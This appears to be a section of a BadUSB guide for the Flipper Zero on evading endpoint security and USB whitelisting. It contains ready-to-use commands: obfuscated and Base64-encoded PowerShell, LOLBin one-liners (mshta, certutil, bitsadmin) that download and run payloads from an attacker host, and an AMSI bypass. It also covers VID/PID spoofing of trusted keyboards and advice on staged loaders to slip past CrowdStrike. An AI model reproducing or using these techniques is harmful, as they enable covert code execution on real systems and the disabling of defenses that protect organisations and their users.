## Evasion Techniques

### EDR/Antivirus Evasion

**Problem:** modern EDR solutions (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) can detect suspicious PowerShell commands even when typed from a keyboard.

**Technique 1 - PowerShell Obfuscation:**
```
REM Instead of "powershell", use abbreviations
STRING powershell -w h -ep byp -nop -c "..."
```

**Technique 2 - Base64 Encoding:**
```
STRING powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA...
```
(The encoded payload is less detectable by static signatures)

**Technique 3 - Living off the Land (LOLBins):**
Use legitimate Windows executables to run payloads:
```
STRING mshta http://ATTACKER/payload.hta
STRING certutil -urlcache -split -f http://ATTACKER/payload.exe %TEMP%\svc.exe
STRING rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write(...)
STRING bitsadmin /transfer job http://ATTACKER/payload.exe %TEMP%\svc.exe
```

**Technique 4 - AMSI Bypass:**
```
STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
(Disables AMSI for the current session - allows execution of scripts that would otherwise be blocked)

**Technique 5 - VID/PID Spoofing:**
Modify the Flipper's VID/PID to make it appear as a legitimate keyboard:
- Logitech: VID 046D
- Microsoft: VID 045E
- Dell: VID 413C

### USB Device Control Evasion

**Problem:** some enterprise environments block unknown USB devices.

**Technique 1 - VID/PID of an already authorized keyboard:**
If the environment uses USB whitelisting, the Flipper must have the same VID/PID as an already authorized keyboard.

**Technique 2 - USB Armory / Network Adapter:**
Some systems block USB keyboards but allow network adapters. The Flipper can emulate a USB Ethernet adapter (RNDIS) for traffic injection.

### Timing and Speed

- **Slow machines:** increase delays (DEFAULT_DELAY 200-500)
- **Fast machines with SSD:** lower delays (DEFAULT_DELAY 50-100)
- **VM/RDP:** additional latency, very generous delays needed (500-1000ms)
- **WAIT_FOR_BUTTON_PRESS:** use this command to wait for the right moment before executing the critical part of the payload

> **Personal note:** Evasion is the hardest part. A payload that works perfectly in the lab can fail miserably on a corporate PC with CrowdStrike. The technique that has given me the best results is combining LOLBins with staged payloads: the BadUSB downloads only a small loader that in turn downloads the actual payload. This reduces the "signature" of the initial command and makes detection harder.

---
